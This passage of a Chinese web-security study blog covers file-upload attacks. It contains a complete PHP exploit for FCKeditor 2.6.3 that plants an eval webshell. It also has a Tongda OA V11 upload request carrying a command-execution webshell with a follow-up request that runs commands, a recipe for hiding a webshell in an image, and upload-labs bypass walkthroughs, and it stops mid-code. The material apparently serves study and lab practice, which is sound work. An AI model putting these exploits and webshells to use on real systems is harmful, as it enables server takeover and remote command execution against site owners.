class="line">https://navisec.it/编辑器漏洞手册/</span><br></pre></td></tr></table></figure><h4 id="编辑器"><a href="#编辑器" class="headerlink" title="编辑器"></a>编辑器</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114902.png" alt="image-20210905162111734"></p><h4 id="fckeditor263"><a href="#fckeditor263" class="headerlink" title="fckeditor263"></a>fckeditor263</h4><p>这里以fckeditor263为例进行演示</p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&quot;default_socket_timeout&quot;</span>, <span class="number">5</span>);</span><br><span class="line">define(STDIN, fopen(<span class="string">&quot;php://stdin&quot;</span>, <span class="string">&quot;r&quot;</span>));</span><br><span class="line"><span class="variable">$match</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">http_send</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$packet</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$sock</span> = fsockopen(<span class="variable">$host</span>, <span class="number">80</span>);</span><br><span class="line"><span class="keyword">while</span> (!<span class="variable">$sock</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\n[-] No response from <span class="subst">&#123;$host&#125;</span>:80 Trying again...&quot;</span>;</span><br><span class="line"><span class="variable">$sock</span> = fsockopen(<span class="variable">$host</span>, <span class="number">80</span>);</span><br><span class="line">&#125;</span><br><span class="line">fputs(<span class="variable">$sock</span>, <span class="variable">$packet</span>);</span><br><span class="line"><span class="keyword">while</span> (!feof(<span class="variable">$sock</span>)) <span class="variable">$resp</span> .= fread(<span class="variable">$sock</span>, <span class="number">1024</span>);</span><br><span class="line">fclose(<span class="variable">$sock</span>);</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$resp</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$resp</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">connector_response</span>(<span class="params"><span class="variable">$html</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$match</span>;</span><br><span class="line"><span class="keyword">return</span> (preg_match(<span class="string">&quot;/OnUploadCompleted\((\d),\&quot;(.*)\&quot;\)/&quot;</span>, <span class="variable">$html</span>, <span class="variable">$match</span>) &amp;&amp; in_array(<span class="variable">$match</span>[<span class="number">1</span>], <span class="keyword">array</span>(<span class="number">0</span>, <span class="number">201</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\n+------------------------------------------------------------------+&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\n| FCKEditor Servelet Arbitrary File Upload Exploit |&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\n+------------------------------------------------------------------+\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$argc</span> &lt; <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\nUsage......: php <span class="subst">$argv</span>[0] host path\n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\nExample....: php <span class="subst">$argv</span>[0] localhost /\n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\nExample....: php <span class="subst">$argv</span>[0] localhost /FCKEditor/\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$host</span> = <span class="variable">$argv</span>[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$path</span> = ereg_replace(<span class="string">&quot;(/)&#123;2,&#125;&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="variable">$argv</span>[<span class="number">2</span>]);</span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;fvck.gif&quot;</span>;</span><br><span class="line"><span class="variable">$foldername</span> = <span class="string">&quot;fuck.php%00.gif&quot;</span>;</span><br><span class="line"><span class="variable">$connector</span> = <span class="string">&quot;editor/filemanager/connectors/php/connector.php&quot;</span>;</span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&quot;-----------------------------265001916915724\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$payload</span> .= <span class="string">&quot;Content-Disposition: form-data; name=\&quot;NewFile\&quot;; filename=\&quot;<span class="subst">&#123;$filename&#125;</span>\&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$payload</span> .= <span class="string">&quot;Content-Type: image/jpeg\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$payload</span> .= <span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&quot;\r\n&quot;</span>.<span class="string">&#x27;&lt;?php eval($_POST[cmd]) ?&gt;&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$payload</span> .= <span class="string">&quot;-----------------------------265001916915724--\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$packet</span> = <span class="string">&quot;POST <span class="subst">&#123;$path&#125;</span><span class="subst">&#123;$connector&#125;</span>?Command=FileUpload&amp;Type=Image&amp;CurrentFolder=&quot;</span>.<span class="variable">$foldername</span>.<span class="string">&quot; HTTP/1.0\r\n&quot;</span>;<span class="comment">//print $packet;</span></span><br><span class="line"><span class="variable">$packet</span> .= <span class="string">&quot;Host: <span class="subst">&#123;$host&#125;</span>\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$packet</span> .= <span class="string">&quot;Content-Type: multipart/form-data; boundary=---------------------------265001916915724\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$packet</span> .= <span class="string">&quot;Content-Length: &quot;</span>.strlen(<span class="variable">$payload</span>).<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$packet</span> .= <span class="string">&quot;Connection: close\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$packet</span> .= <span class="variable">$payload</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$packet</span>;</span><br><span class="line"><span class="keyword">if</span> (!connector_response(http_send(<span class="variable">$host</span>, <span class="variable">$packet</span>))) <span class="keyword">die</span>(<span class="string">&quot;\n[-] Upload failed!\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">print</span> <span class="string">&quot;\n[-] Job done! try http://$&#123;host&#125;/<span class="subst">$match</span>[2] \n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>利用</strong></p><p>通过执行脚本进行利用,利用需要知道WEB编辑器的路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php fck.php 127.0.0.1:8080 /fckeditor263/</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114402.png" alt="image-20210905162419415"></p><h3 id="CMS-文件上传"><a href="#CMS-文件上传" class="headerlink" title="CMS 文件上传"></a>CMS 文件上传</h3><p>识别网站CMS后该怎么办？以通达OA CMS为例</p><h4 id="通达OA-CMS-V11版本"><a href="#通达OA-CMS-V11版本" class="headerlink" title="通达OA CMS(V11版本)"></a>通达OA CMS(V11版本)</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114956.png" alt="image-20210905165220547"></p><h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>路径为：ispirit/im/upload.php</p><p>抓包构造POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST /ispirit/im/upload.php HTTP/1.1</span><br><span class="line">Host: localhost:999</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5</span><br><span class="line">Cookie: PHPSESSID=123</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 660</span><br><span class="line">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="line">Content-Disposition: form-data; name=&quot;UPLOAD_MODE&quot;</span><br><span class="line">2</span><br><span class="line">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="line">Content-Disposition: form-data; name=&quot;P&quot;</span><br><span class="line">123</span><br><span class="line">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="line">Content-Disposition: form-data; name=&quot;DEST_UID&quot;</span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="line">Content-Disposition: form-data; name=&quot;ATTACHMENT&quot;; filename=&quot;jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line">&lt;?php</span><br><span class="line">$command=$_POST[&#x27;cmd&#x27;];</span><br><span class="line">$wsh = new COM(&#x27;WScript.shell&#x27;);</span><br><span class="line">$exec = $wsh-&gt;exec(&quot;cmd /c &quot;.$command);</span><br><span class="line">$stdout = $exec-&gt;StdOut();</span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="line">echo $stroutput;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114321.png" alt="image-20210905165442538"></p><p>上传成功；上传成功后访问文件包含路径<code>/ispirit/interface/geteway.php</code></p><p>　　burp抓包构造数据包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /mac/gateway.php HTTP/1.1</span><br><span class="line">Host: 10.10.20.116:88（根据自己的IP而定）</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: python-requests/2.21.0</span><br><span class="line">Content-Length: 69</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">json=&#123;&quot;url&quot;:&quot;/general/../../attach/im/2003/941633647.jpg&quot;&#125;&amp;cmd=whoami</span><br></pre></td></tr></table></figure><p>　　发送指令可发现命令执行成功：</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114328.png" alt="image-20210905172106015"></p><h5 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/twlr/p/12989951.html#_label0_1</span><br></pre></td></tr></table></figure><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://navisec.it/编辑器漏洞手册/</span><br><span class="line">https://www.jb51.net/softs/75619.html</span><br><span class="line">https://pan.baidu.com/s/1eLjH_88fhXAw3ZwE7kVRbA 提取码：ywek</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>22WEB漏洞-文件上传之内容逻辑数组绕过</title>
      <link href="/2021/09/21/22WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/"/>
      <url>/2021/09/21/22WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%86%85%E5%AE%B9%E9%80%BB%E8%BE%91%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="图片一句话制作方法："><a href="#图片一句话制作方法：" class="headerlink" title="图片一句话制作方法："></a>图片一句话制作方法：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.png /b + shell.php /a webshell.jpg </span><br></pre></td></tr></table></figure><h3 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h3><h4 id="文件头检测"><a href="#文件头检测" class="headerlink" title="文件头检测"></a>文件头检测</h4><p>图片马需要利用文件包含来执行一句话，单纯的上传图片马是不可以执行的，和正常图片没什么区别</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-13/index.php</span><br></pre></td></tr></table></figure><p><strong>检测函数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">function getReailFileType($filename)&#123;</span><br><span class="line">    $file = fopen($filename, &quot;rb&quot;);</span><br><span class="line">    $bin = fread($file, 2); //只读2字节，获取文件类型</span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(&quot;C2chars&quot;, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]);    </span><br><span class="line">    $fileType = &#x27;&#x27;;    </span><br><span class="line">    switch($typeCode)&#123;      </span><br><span class="line">        case 255216:            </span><br><span class="line">            $fileType = &#x27;jpg&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        case 13780:            </span><br><span class="line">            $fileType = &#x27;png&#x27;;</span><br><span class="line">            break;        </span><br><span class="line">        case 7173:            </span><br><span class="line">            $fileType = &#x27;gif&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        default:            </span><br><span class="line">            $fileType = &#x27;unknown&#x27;;</span><br><span class="line">        &#125;    </span><br><span class="line">        return $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    if($file_type == &#x27;unknown&#x27;)&#123;</span><br><span class="line">        $msg = &quot;文件未知，上传失败！&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;//将前面判断的文件类型拼接</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg = &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>绕过</strong></p><p>这里只需要伪造一个文件头是图片格式就可以绕过，但是最后拼接的时候是根据判断拼接的，所以还是需要配合文件包含才可以执行shell。当然这里上传图片马也可以。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112683.png" alt="image-20210904155945718"></p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112618.png" alt="image-20210904160009391" style="zoom:67%;" /><h4 id="getimagesize函数绕过"><a href="#getimagesize函数绕过" class="headerlink" title="getimagesize函数绕过"></a>getimagesize函数绕过</h4><p>getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。函数成功返回的就是一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-14/index.php</span><br></pre></td></tr></table></figure><p><strong>检测代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">function isImage($filename)&#123;</span><br><span class="line">    $types = &#x27;.jpeg|.png|.gif&#x27;;</span><br><span class="line">    if(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[2]);</span><br><span class="line">        if(stripos($types,$ext))&#123;</span><br><span class="line">            return $ext;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    if(!$res)&#123;</span><br><span class="line">        $msg = &quot;文件未知，上传失败！&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res;</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg = &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>该函数会返回图片的信息，所有如果不上传图片马是绕不过去的。</p><p><strong>绕过</strong></p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112860.png" alt="image-20210904163347922" /><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112179.png" alt="image-20210904163405278"></p><h3 id="exif-imagetype函数绕过"><a href="#exif-imagetype函数绕过" class="headerlink" title="exif_imagetype函数绕过"></a>exif_imagetype函数绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-15/index.php</span><br></pre></td></tr></table></figure><p><strong>检测代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">function isImage($filename)&#123;</span><br><span class="line">    //需要开启php_exif模块</span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    switch ($image_type) &#123;</span><br><span class="line">        case IMAGETYPE_GIF:</span><br><span class="line">            return &quot;gif&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case IMAGETYPE_JPEG:</span><br><span class="line">            return &quot;jpg&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case IMAGETYPE_PNG:</span><br><span class="line">            return &quot;png&quot;;</span><br><span class="line">            break;    </span><br><span class="line">        default:</span><br><span class="line">            return false;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    if(!$res)&#123;</span><br><span class="line">        $msg = &quot;文件未知，上传失败！&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res;</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg = &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exif_imagetype — 判断一个图像的类型并且会判断他的签名</p><h4 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>通过上传图片马绕过</p><h3 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h3><p>原理：将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。</p><h4 id="检测代码"><a href="#检测代码" class="headerlink" title="检测代码"></a>检测代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span><br><span class="line">    $filename = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">    $filetype = $_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;];</span><br><span class="line">    $tmpname = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line"></span><br><span class="line">    $target_path=$UPLOAD_ADDR.basename($filename);</span><br><span class="line"></span><br><span class="line">    // 获得上传文件的扩展名</span><br><span class="line">    $fileext= substr(strrchr($filename,&quot;.&quot;),1);</span><br><span class="line"></span><br><span class="line">    //判断文件后缀与类型，合法才进行上传操作</span><br><span class="line">    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是jpg格式的图片！&quot;;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.jpg&quot;;</span><br><span class="line">                $newimagepath = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                imagejpeg($im,$newimagepath);</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                unlink($target_path);</span><br><span class="line">                